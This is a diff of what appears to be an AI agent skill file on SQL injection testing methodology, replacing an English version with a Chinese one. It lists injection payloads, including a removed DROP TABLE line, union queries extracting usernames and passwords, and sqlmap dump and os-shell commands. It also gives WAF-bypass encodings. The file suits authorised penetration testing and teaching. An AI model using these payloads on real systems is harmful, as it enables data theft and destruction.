@@ -1,88 +1,100 @@
-# SQL Injection Testing Skill
+---
+name: sql-injection-testing
+description: SQL注入测试的专业技能和方法论
+version: 1.0.0
+---
 
-## Overview
-SQL injection vulnerabilities occur when user input is incorrectly filtered or not strongly typed.
+# SQL注入测试技能
 
-## Testing Methodology
+## 概述
 
-### 1. Detection
-```
-# Boolean-based blind
-' OR 1=1 --
-' AND 1=2 --
+SQL注入是一种常见且危险的Web应用漏洞。本技能提供了系统化的SQL注入测试方法、检测技术和利用策略。
 
-# Time-based blind  
-' AND SLEEP(5) --
-' OR SLEEP(5) --
+## 测试方法
 
-# Union-based
-' UNION SELECT NULL --
-' UNION SELECT 1,2,3 --
+### 1. 参数识别
+- 识别所有用户输入点：URL参数、POST数据、HTTP头、Cookie等
+- 重点关注：id、search、filter、sort等参数
+- 使用Burp Suite或类似工具拦截和修改请求
 
-# Error-based
-' AND EXTRACTVALUE(1,CONCAT(0x7e,version())) --
-```
+### 2. 基础检测
+- 单引号测试：`'` - 查看是否出现SQL错误
+- 布尔盲注：`' AND '1'='1` vs `' AND '1'='2`
+- 时间盲注：`' AND SLEEP(5)--`
+- 联合查询：`' UNION SELECT NULL--`
 
-### 2. Tools
-- **sqlmap**: Automatic SQL injection detection and exploitation
-- **ffuf**: Quick parameter fuzzing
-- ** nuclei**: Template-based detection
+### 3. 数据库识别
+- MySQL：`' AND @@version LIKE '%mysql%'--`
+- PostgreSQL：`' AND version() LIKE '%PostgreSQL%'--`
+- MSSQL：`' AND @@version LIKE '%Microsoft%'--`
+- Oracle：`' AND (SELECT banner FROM v$version WHERE rownum=1) LIKE '%Oracle%'--`
 
-### 3. Payloads by Type
+### 4. 信息提取
+- 数据库名：`' UNION SELECT database()--`
+- 表名：`' UNION SELECT table_name FROM information_schema.tables--`
+- 列名：`' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--`
+- 数据提取：`' UNION SELECT username,password FROM users--`
 
-#### MySQL
-```sql
-' OR '1'='1
-' UNION SELECT NULL--
-' UNION SELECT NULL,NULL--
-' AND SLEEP(5)--
-' AND (SELECT * FROM (SELECT SLEEP(5))a)--
-```
+## 工具使用
 
-#### PostgreSQL
-```sql
-' OR '1'='1
-' UNION SELECT NULL--
-'; DROP TABLE users--
-' AND 1=CAST(@@version AS int)--
-```
-
-#### MSSQL
-```sql
-' OR 1=1--
-'; SELECT * FROM users--
-'; WAITFOR DELAY '00:00:05'--
-```
-
-### 4. Exploitation Commands
-
+### sqlmap
 ```bash
-# Basic scan with sqlmap
-sqlmap -r request.txt --batch --level=5
+# 基础扫描
+sqlmap -u "http://target.com/page?id=1"
 
-# Specific parameter
-sqlmap -r request.txt -p id --batch
+# 指定参数
+sqlmap -u "http://target.com/page" --data="id=1" --method=POST
 
-# Database enumeration
-sqlmap -r request.txt --dbs
-sqlmap -r request.txt -D database_name --tables
-sqlmap -r request.txt -D database_name -T users --dump
+# 指定数据库类型
+sqlmap -u "http://target.com/page?id=1" --dbms=mysql
 
-# Shell access
-sqlmap -r request.txt --os-shell
+# 获取数据库列表
+sqlmap -u "http://target.com/page?id=1" --dbs
+
+# 获取表
+sqlmap -u "http://target.com/page?id=1" -D database_name --tables
+
+# 获取数据
+sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump
 ```
 
-### 5. Remediation
-- Use parameterized queries (Prepared Statements)
-- Input validation and whitelisting
-- Least privilege principle for database accounts
-- Regular security scanning
+### 手动测试
+- 使用Burp Suite的Repeater模块
+- 使用浏览器开发者工具
+- 编写Python脚本自动化测试
 
-## Testing Checklist
-- [ ] Identify all user-input fields
-- [ ] Test with boolean-based payloads
-- [ ] Test with time-based payloads
-- [ ] Test union-based payloads
-- [ ] Enumerate database version and structure
-- [ ] Attempt data extraction
-- [ ] Document findings with evidence
+## 绕过技术
+
+### WAF绕过
+- 编码绕过：URL编码、Unicode编码、十六进制编码
+- 注释绕过：`/**/`, `--`, `#`
+- 大小写混合：`SeLeCt`, `UnIoN`
+- 空格替换：`/**/`, `+`, `%09`(Tab), `%0A`(换行)
+
+### 示例
+```
+原始：' UNION SELECT NULL--
+绕过1：'/**/UNION/**/SELECT/**/NULL--
+绕过2：'%55nion%20select%20null--
+绕过3：'/*!UNION*//*!SELECT*/null--
+```
+
+## 验证和报告
+
+### 验证步骤
+1. 确认可以执行SQL语句
+2. 提取数据库信息验证
+3. 评估影响范围（数据泄露、权限提升等）
+4. 记录完整的POC（请求/响应）
+
+### 报告要点
+- 漏洞位置和参数
+- 影响的数据和系统
+- 完整的利用步骤
+- 修复建议（参数化查询、输入验证等）
+
+## 注意事项
+- 仅在授权测试环境中进行
+- 避免对生产数据造成破坏
+- 谨慎使用DROP、DELETE等危险操作
+- 记录所有测试步骤以便复现
